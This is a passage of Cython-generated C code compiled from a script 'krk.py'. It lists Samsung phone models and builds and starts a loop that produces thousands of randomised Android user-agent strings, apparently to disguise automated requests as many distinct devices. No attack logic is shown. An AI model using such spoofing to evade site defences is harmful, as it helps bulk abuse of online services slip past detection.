  PyList_SET_ITEM(__pyx_t_6, 102, __pyx_kp_s_SM_T805_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_SM_T231_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T231_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 103, __pyx_kp_s_SM_T231_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_N5100_JZO54K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N5100_JZO54K);
  PyList_SET_ITEM(__pyx_t_6, 104, __pyx_kp_s_GT_N5100_JZO54K);
  __Pyx_INCREF(__pyx_kp_s_SM_J320H_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320H_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 105, __pyx_kp_s_SM_J320H_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_T231_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T231_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 106, __pyx_kp_s_SM_T231_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_G930F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G930F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 107, __pyx_kp_s_SM_G930F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_SM_G935F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G935F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 108, __pyx_kp_s_SM_G935F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_SM_T310_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T310_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 109, __pyx_kp_s_SM_T310_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N8000_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 110, __pyx_kp_s_GT_N8000_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300I_KTU84P);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300I_KTU84P);
  PyList_SET_ITEM(__pyx_t_6, 111, __pyx_kp_s_GT_I9300I_KTU84P);
  __Pyx_INCREF(__pyx_kp_s_SM_G920F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G920F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 112, __pyx_kp_s_SM_G920F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN_NMF26X);
  PyList_SET_ITEM(__pyx_t_6, 113, __pyx_kp_s_SM_J510FN_NMF26X);
  __Pyx_INCREF(__pyx_kp_s_SM_T705_LRX22G_2);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T705_LRX22G_2);
  PyList_SET_ITEM(__pyx_t_6, 114, __pyx_kp_s_SM_T705_LRX22G_2);
  __Pyx_INCREF(__pyx_kp_s_GT_P3110_JZO54K);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P3110_JZO54K);
  PyList_SET_ITEM(__pyx_t_6, 115, __pyx_kp_s_GT_P3110_JZO54K);
  __Pyx_INCREF(__pyx_kp_s_GT_I9192_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9192_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 116, __pyx_kp_s_GT_I9192_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 117, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_G920F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G920F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 118, __pyx_kp_s_SM_G920F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300_IMM76D);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300_IMM76D);
  PyList_SET_ITEM(__pyx_t_6, 119, __pyx_kp_s_GT_I9300_IMM76D);
  __Pyx_INCREF(__pyx_kp_s_SM_G950F_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_G950F_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 120, __pyx_kp_s_SM_G950F_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 121, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN_NMF26X_2);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN_NMF26X_2);
  PyList_SET_ITEM(__pyx_t_6, 122, __pyx_kp_s_SM_J510FN_NMF26X_2);
  __Pyx_INCREF(__pyx_kp_s_SM_J701F_NRD90M_2);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J701F_NRD90M_2);
  PyList_SET_ITEM(__pyx_t_6, 123, __pyx_kp_s_SM_J701F_NRD90M_2);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 124, __pyx_kp_s_SM_A500F_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_SM_T231_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T231_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 125, __pyx_kp_s_SM_T231_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_T311_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T311_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 126, __pyx_kp_s_SM_T311_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320FN_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 127, __pyx_kp_s_SM_J320FN_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_GT_P5210_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5210_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 128, __pyx_kp_s_GT_P5210_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_T805_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T805_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 129, __pyx_kp_s_SM_T805_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_GT_I9500_LRX22C);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9500_LRX22C);
  PyList_SET_ITEM(__pyx_t_6, 130, __pyx_kp_s_GT_I9500_LRX22C);
  __Pyx_INCREF(__pyx_kp_s_GT_P5200_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5200_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 131, __pyx_kp_s_GT_P5200_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_I9301I_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9301I_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 132, __pyx_kp_s_GT_I9301I_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_I9300_JSS15J);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9300_JSS15J);
  PyList_SET_ITEM(__pyx_t_6, 133, __pyx_kp_s_GT_I9300_JSS15J);
  __Pyx_INCREF(__pyx_kp_s_GT_N7100_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_N7100_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 134, __pyx_kp_s_GT_N7100_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_T531_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T531_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 135, __pyx_kp_s_SM_T531_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_SM_T820_NRD90M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T820_NRD90M);
  PyList_SET_ITEM(__pyx_t_6, 136, __pyx_kp_s_SM_T820_NRD90M);
  __Pyx_INCREF(__pyx_kp_s_SM_T315_JDQ39);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T315_JDQ39);
  PyList_SET_ITEM(__pyx_t_6, 137, __pyx_kp_s_SM_T315_JDQ39);
  __Pyx_INCREF(__pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J320F_LMY47V);
  PyList_SET_ITEM(__pyx_t_6, 138, __pyx_kp_s_SM_J320F_LMY47V);
  __Pyx_INCREF(__pyx_kp_s_GT_I9190_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9190_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 139, __pyx_kp_s_GT_I9190_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_P5220_JDQ39);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5220_JDQ39);
  PyList_SET_ITEM(__pyx_t_6, 140, __pyx_kp_s_GT_P5220_JDQ39);
  __Pyx_INCREF(__pyx_kp_s_SM_T525_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T525_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 141, __pyx_kp_s_SM_T525_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_T555_LRX22G);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T555_LRX22G);
  PyList_SET_ITEM(__pyx_t_6, 142, __pyx_kp_s_SM_T555_LRX22G);
  __Pyx_INCREF(__pyx_kp_s_GT_I9190_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9190_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 143, __pyx_kp_s_GT_I9190_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_SM_J510FN_NMF26X_2);
  __Pyx_GIVEREF(__pyx_kp_s_SM_J510FN_NMF26X_2);
  PyList_SET_ITEM(__pyx_t_6, 144, __pyx_kp_s_SM_J510FN_NMF26X_2);
  __Pyx_INCREF(__pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_GIVEREF(__pyx_kp_s_SM_A500F_MMB29M);
  PyList_SET_ITEM(__pyx_t_6, 145, __pyx_kp_s_SM_A500F_MMB29M);
  __Pyx_INCREF(__pyx_kp_s_GT_I9192_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_GT_I9192_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 146, __pyx_kp_s_GT_I9192_KOT49H);
  __Pyx_INCREF(__pyx_kp_s_GT_P5100_JDQ);
  __Pyx_GIVEREF(__pyx_kp_s_GT_P5100_JDQ);
  PyList_SET_ITEM(__pyx_t_6, 147, __pyx_kp_s_GT_P5100_JDQ);
  __Pyx_INCREF(__pyx_kp_s_SM_T311_KOT49H);
  __Pyx_GIVEREF(__pyx_kp_s_SM_T311_KOT49H);
  PyList_SET_ITEM(__pyx_t_6, 148, __pyx_kp_s_SM_T311_KOT49H);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_samsung, __pyx_t_6) < 0) __PYX_ERR(0, 18, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "krk.py":19
 * gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
 * samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
 * ugen=[]             # <<<<<<<<<<<<<<
 * for xd in range(10000):
 *         aa='Mozilla/5.0 (Linux; U; Android'
 */
  __pyx_t_6 = PyList_New(0); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_6);
  if (PyDict_SetItem(__pyx_d, __pyx_n_s_ugen, __pyx_t_6) < 0) __PYX_ERR(0, 19, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

  /* "krk.py":20
 * samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'GT-N7100|KOT49H', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-J320FN|LMY47V', 'SM-J320FN|LMY47V', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-A500F|MMB29M', 'GT-N8000|KOT49H', 'SM-T561|KTU84P', 'SM-G900F|KOT49H', 'GT-S7390|JZO54K', 'SM-J320F|LMY47V', 'GT-P5100|JZO54K', 'SM-A500FU|MMB29M', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H', 'SM-T531|LRX22G', 'SM-J510FN|MMB29M', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5110|JDQ39', 'GT-I9301I|KOT49H', 'SM-A500F|LRX22G', 'SM-G930F|NRD90M', 'SM-T311|KOT4', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'SM-J320M|LMY47V', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'GT-I9192|KOT49H', 'SM-G935F|MMB29K', 'SM-J701F|NRD90M;', 'GT-I9301I|KOT4', 'SM-J320FN|LMY47V', 'SM-T111|JDQ39', 'SM-A500F|MMB29M', 'SM-J510FN|NMF2', 'SM-T705|LRX22G', 'SM-G920F|NRD90M', 'GT-N5100|JZO54K', 'GT-I9300I|KTU84P', 'GT-I9300I|KTU84P', 'GT-N8000|KOT49H', 'GT-N8000|KOT49H', 'SM-A500F|MMB29M', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X', 'SM-J320F|LMY47V', 'GT-P5100|JDQ39', 'GT-I9300I|KTU84P', 'GT-N5100|JZO54K', 'GT-N8000|KOT49H', 'GT-I9500|LRX22C', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'GT-N8000|JZO54K', 'SM-T805|LRX22G', 'SM-T231|KOT49H', 'GT-N5100|JZO54K', 'SM-J320H|LMY47V', 'SM-T231|KOT49H', 'SM-G930F|NRD90M', 'SM-G935F|NRD90M', 'SM-T310|KOT49H', 'GT-N8000|KOT49H', 'GT-I9300I|KTU84P', 'SM-G920F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T705|LRX22G;', 'GT-P3110|JZO54K', 'GT-I9192|KOT49H', 'SM-J320F|LMY47V', 'SM-G920F|NRD90M', 'GT-I9300|IMM76D', 'SM-G950F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X;', 'SM-J701F|NRD90M', 'SM-A500F|LRX22G', 'SM-T231|KOT49H', 'SM-T311|KOT49H', 'SM-J320FN|LMY47V', 'GT-P5210|KOT49H', 'SM-T805|LRX22G', 'GT-I9500|LRX22C', 'GT-P5200|KOT49H', 'GT-I9301I|KOT49H', 'GT-I9300|JSS15J', 'GT-N7100|KOT49H', 'SM-T531|LRX22G', 'SM-T820|NRD90M', 'SM-T315|JDQ39', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-P5220|JDQ39', 'SM-T525|KOT49H', 'SM-T555|LRX22G', 'GT-I9190|KOT49H', 'SM-J510FN|NMF26X;', 'SM-A500F|MMB29M', 'GT-I9192|KOT49H', 'GT-P5100|JDQ', 'SM-T311|KOT49H']
 * ugen=[]
 * for xd in range(10000):             # <<<<<<<<<<<<<<
 *         aa='Mozilla/5.0 (Linux; U; Android'
 *         b=random.choice(['6','7','8','9','10','11','12','13'])
 */
  for (__pyx_t_10 = 0; __pyx_t_10 < 0x2710; __pyx_t_10+=1) {
    __pyx_t_6 = __Pyx_PyInt_From_long(__pyx_t_10); if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 20, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_6);
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_xd, __pyx_t_6) < 0) __PYX_ERR(0, 20, __pyx_L1_error)
    __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;

    /* "krk.py":21
 * ugen=[]
 * for xd in range(10000):
 *         aa='Mozilla/5.0 (Linux; U; Android'             # <<<<<<<<<<<<<<
 *         b=random.choice(['6','7','8','9','10','11','12','13'])
 *         c=f' TL-tl; {str(gt)}'
 */
    if (PyDict_SetItem(__pyx_d, __pyx_n_s_aa, __pyx_kp_s_Mozilla_5_0_Linux_U_Android) < 0) __PYX_ERR(0, 21, __pyx_L1_error)

    /* "krk.py":22
 * for xd in range(10000):
 *         aa='Mozilla/5.0 (Linux; U; Android'
 *         b=random.choice(['6','7','8','9','10','11','12','13'])             # <<<<<<<<<<<<<<
 *         c=f' TL-tl; {str(gt)}'
 *         g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
 */
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 22, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 22, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = PyList_New(8); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 22, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_INCREF(__pyx_kp_s_6);
    __Pyx_GIVEREF(__pyx_kp_s_6);
    PyList_SET_ITEM(__pyx_t_3, 0, __pyx_kp_s_6);
    __Pyx_INCREF(__pyx_kp_s_7);
    __Pyx_GIVEREF(__pyx_kp_s_7);
    PyList_SET_ITEM(__pyx_t_3, 1, __pyx_kp_s_7);
    __Pyx_INCREF(__pyx_kp_s_8);
    __Pyx_GIVEREF(__pyx_kp_s_8);
    PyList_SET_ITEM(__pyx_t_3, 2, __pyx_kp_s_8);
    __Pyx_INCREF(__pyx_kp_s_9);
    __Pyx_GIVEREF(__pyx_kp_s_9);
    PyList_SET_ITEM(__pyx_t_3, 3, __pyx_kp_s_9);
    __Pyx_INCREF(__pyx_kp_s_10);
    __Pyx_GIVEREF(__pyx_kp_s_10);
    PyList_SET_ITEM(__pyx_t_3, 4, __pyx_kp_s_10);
    __Pyx_INCREF(__pyx_kp_s_11);
    __Pyx_GIVEREF(__pyx_kp_s_11);
